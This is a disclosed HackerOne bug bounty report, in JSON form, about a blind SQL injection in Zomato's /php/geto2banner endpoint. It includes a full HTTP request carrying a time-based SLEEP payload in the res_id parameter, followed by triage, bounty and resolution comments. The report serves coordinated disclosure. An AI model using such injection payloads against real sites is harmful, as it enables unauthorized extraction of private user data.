{"id":838855,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84Mzg4NTU=","url":"https://hackerone.com/reports/838855","title":"[www.zomato.com] Blind SQL Injection in /php/geto2banner","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-04-04T14:15:36.412Z","submitted_at":"2020-04-04T14:15:36.412Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"zzzhacker13","url":"/zzzhacker13","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/EDKodYArUp4pWfyihgQX3RCw/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2943,"url":"https://hackerone.com/zomato","handle":"zomato","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Zomato","twitter_handle":"Zomato","website":"https://www.zomato.com","about":"The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-08-10T13:27:02.782Z","bug_reporter_agreed_on_going_public_at":"2020-08-10T13:17:17.987Z","team_member_agreed_on_going_public_at":"2020-08-10T13:27:02.679Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Hi Team!\n\nOur team discovered a ``Blind SQL Injection`` by Abusing LocalParams (`res_id`) in `/php/geto2banner`\n**We are working to create a full PDF Report as an WriteUp ;)**\n\n## Here is a Temporal Exploit based on the Vulnerable request:\n\n```\nPOST /php/geto2banner HTTP/1.1\nHost: www.zomato.com\nConnection: close\nContent-Length: 73\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\nContent-type: application/x-www-form-urlencoded\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language: en\n\nres_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END\u0026city_id=0\n```\n\nThank you so much!!\n\n- As you can see in the request - we are able to **Exploit** it to **extract data from your DB**!\n\n## Impact\n\n## Full database access holding private user information.","vulnerability_information_html":"\u003ch2 id=\"hi-team\"\u003eHi Team!\u003c/h2\u003e\n\n\u003cp\u003eOur team discovered a \u003ccode\u003eBlind SQL Injection\u003c/code\u003e by Abusing LocalParams (\u003ccode\u003eres_id\u003c/code\u003e) in \u003ccode\u003e/php/geto2banner\u003c/code\u003e\u003cbr\u003e\n\u003cstrong\u003eWe are working to create a full PDF Report as an WriteUp ;)\u003c/strong\u003e\u003c/p\u003e\n\n\u003ch2 id=\"here-is-a-temporal-exploit-based-on-the-vulnerable-request\"\u003eHere is a Temporal Exploit based on the Vulnerable request:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /php/geto2banner HTTP/1.1\nHost: www.zomato.com\nConnection: close\nContent-Length: 73\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\nContent-type: application/x-www-form-urlencoded\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language: en\n\nres_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END\u0026amp;city_id=0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThank you so much!!\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eAs you can see in the request - we are able to \u003cstrong\u003eExploit\u003c/strong\u003e it to \u003cstrong\u003eextract data from your DB\u003c/strong\u003e!\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003ch2 id=\"full-database-access-holding-private-user-information\"\u003eFull database access holding private user information.\u003c/h2\u003e\n","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":56,"voters":["mashoud1122","base_64","newbipath12","mygf","ms-13","ashoknagraj1991","pandaaaa","zimmer75","zzzhacker13","sa1tama0","and 46 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":383,"asset_type":"URL","asset_identifier":"*.zomato.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7538606,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-04T15:10:09.828Z","updated_at":"2020-04-04T15:10:09.828Z","actor":{"username":"biryani-is-lob","cleared":false,"url":"/biryani-is-lob","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sYPtN4bJVr35fXwTxNPhuBtp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7538625,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @zzzhacker13, \n\nThanks for the submission, we are able to reproduce the issue you described. \n\n@ehsahil-zomato ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/zzzhacker13\"\u003e@zzzhacker13\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eThanks for the submission, we are able to reproduce the issue you described. \u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/ehsahil-zomato\"\u003e@ehsahil-zomato\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-04T15:14:00.668Z","updated_at":"2020-04-04T15:14:00.668Z","actor":{"username":"biryani-is-lob","cleared":false,"url":"/biryani-is-lob","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sYPtN4bJVr35fXwTxNPhuBtp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7539252,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ehsahil-zomato ;)\n\n**Great! Thank you very much xD**\nVery professional, well done!!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ehsahil-zomato\"\u003e@ehsahil-zomato\u003c/a\u003e ;)\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eGreat! Thank you very much xD\u003c/strong\u003e\u003cbr\u003e\nVery professional, well done!!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-04T17:21:30.797Z","updated_at":"2020-04-04T17:21:30.797Z","actor":{"username":"zzzhacker13","cleared":false,"url":"/zzzhacker13","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EDKodYArUp4pWfyihgQX3RCw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7539327,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ehsahil-zomato\n\n**Hi Sahil,**\n**You forgot to return the signal requirements.**","markdown_message":"\u003cp\u003e\u003ca href=\"/ehsahil-zomato\"\u003e@ehsahil-zomato\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eHi Sahil,\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003eYou forgot to return the signal requirements.\u003c/strong\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-04T17:43:18.068Z","updated_at":"2020-04-04T17:43:18.068Z","actor":{"username":"zzzhacker13","cleared":false,"url":"/zzzhacker13","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EDKodYArUp4pWfyihgQX3RCw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7539740,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ehsahil-zomato ;)\n\n## I can confirm that the Vulnerability has been fixed `200 OK`, well done!\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ehsahil-zomato\"\u003e@ehsahil-zomato\u003c/a\u003e ;)\u003c/p\u003e\n\n\u003ch2 id=\"i-can-confirm-that-the-vulnerability-has-been-fixed-200-ok-well-done\"\u003eI can confirm that the Vulnerability has been fixed \u003ccode\u003e200 OK\u003c/code\u003e, well done!\u003c/h2\u003e\n","automated_response":false,"created_at":"2020-04-04T19:37:18.664Z","updated_at":"2020-04-04T19:37:18.664Z","actor":{"username":"zzzhacker13","cleared":false,"url":"/zzzhacker13","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EDKodYArUp4pWfyihgQX3RCw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7545365,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi mate @ehsahil-zomato ;)\n\n**Here is a Full PDF report with all the details (including Exploit code):**\n\n█████\n\n## Enjoy, Thank you xD","markdown_message":"\u003cp\u003eHi mate \u003ca href=\"/ehsahil-zomato\"\u003e@ehsahil-zomato\u003c/a\u003e ;)\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eHere is a Full PDF report with all the details (including Exploit code):\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e█████\u003c/p\u003e\n\n\u003ch2 id=\"enjoy-thank-you-xd\"\u003eEnjoy, Thank you xD\u003c/h2\u003e\n","automated_response":false,"created_at":"2020-04-05T02:40:11.477Z","updated_at":"2020-08-10T13:25:40.892Z","actor":{"username":"zzzhacker13","cleared":false,"url":"/zzzhacker13","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EDKodYArUp4pWfyihgQX3RCw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7546954,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ehsahil-zomato ;)\n## Any Update\\Bounty\\Resolved?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ehsahil-zomato\"\u003e@ehsahil-zomato\u003c/a\u003e ;)\u003c/p\u003e\n\n\u003ch2 id=\"any-update-bounty-resolved\"\u003eAny Update\\Bounty\\Resolved?\u003c/h2\u003e\n","automated_response":false,"created_at":"2020-04-05T10:07:24.580Z","updated_at":"2020-04-05T10:07:24.580Z","actor":{"username":"zzzhacker13","cleared":false,"url":"/zzzhacker13","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EDKodYArUp4pWfyihgQX3RCw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7557029,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-04-06T11:21:36.011Z","updated_at":"2020-04-06T11:21:36.011Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Zomato"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"zomato","collaborator":{"username":"zzzhacker13","url":"/zzzhacker13"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7557265,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"## Thank you very much guys, you are awesome!!\n@ehsahil-zomato @zomato","markdown_message":"\u003ch2 id=\"thank-you-very-much-guys-you-are-awesome\"\u003eThank you very much guys, you are awesome!!\u003c/h2\u003e\n\n\u003cp\u003e\u003ca href=\"/ehsahil-zomato\"\u003e@ehsahil-zomato\u003c/a\u003e \u003ca href=\"/zomato\"\u003e@zomato\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-06T11:42:33.987Z","updated_at":"2020-04-06T11:42:33.987Z","actor":{"username":"zzzhacker13","cleared":false,"url":"/zzzhacker13","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EDKodYArUp4pWfyihgQX3RCw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7557943,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Closing this as resolved, thank you for your submissions :) ","markdown_message":"\u003cp\u003eClosing this as resolved, thank you for your submissions :) \u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-06T12:40:04.585Z","updated_at":"2020-04-06T12:40:04.585Z","actor":{"username":"biryani-is-lob","cleared":false,"url":"/biryani-is-lob","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/sYPtN4bJVr35fXwTxNPhuBtp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"zzzhacker13","url":"/zzzhacker13"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7558028,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"## Hi team! @prateek_0490 @ehsahil-zomato @zomato xD\n\n**Just wanna say:**\n**After being in so much Bug Bounty programs, like Microsoft, Facebook, Google, etc ..**\n**I must admit that the Best Bug bounty program ever is Zomato, Well done guys!**","markdown_message":"\u003ch2 id=\"hi-team-prateek_0490-ehsahil-zomato-zomato-xd\"\u003eHi team! \u003ca href=\"/prateek_0490\"\u003e@prateek_0490\u003c/a\u003e \u003ca href=\"/ehsahil-zomato\"\u003e@ehsahil-zomato\u003c/a\u003e \u003ca href=\"/zomato\"\u003e@zomato\u003c/a\u003e xD\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003eJust wanna say:\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003eAfter being in so much Bug Bounty programs, like Microsoft, Facebook, Google, etc ..\u003c/strong\u003e\u003cbr\u003e\n\u003cstrong\u003eI must admit that the Best Bug bounty program ever is Zomato, Well done guys!\u003c/strong\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-06T12:50:25.614Z","updated_at":"2020-04-06T12:50:25.614Z","actor":{"username":"zzzhacker13","cleared":false,"url":"/zzzhacker13","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EDKodYArUp4pWfyihgQX3RCw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8893684,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-10T13:17:18.010Z","updated_at":"2020-08-10T13:17:18.010Z","first_to_agree":true,"actor":{"username":"zzzhacker13","cleared":false,"url":"/zzzhacker13","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/EDKodYArUp4pWfyihgQX3RCw/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8893825,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-10T13:27:02.705Z","updated_at":"2020-08-10T13:27:02.705Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8893826,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-10T13:27:02.816Z","updated_at":"2020-08-10T13:27:02.816Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}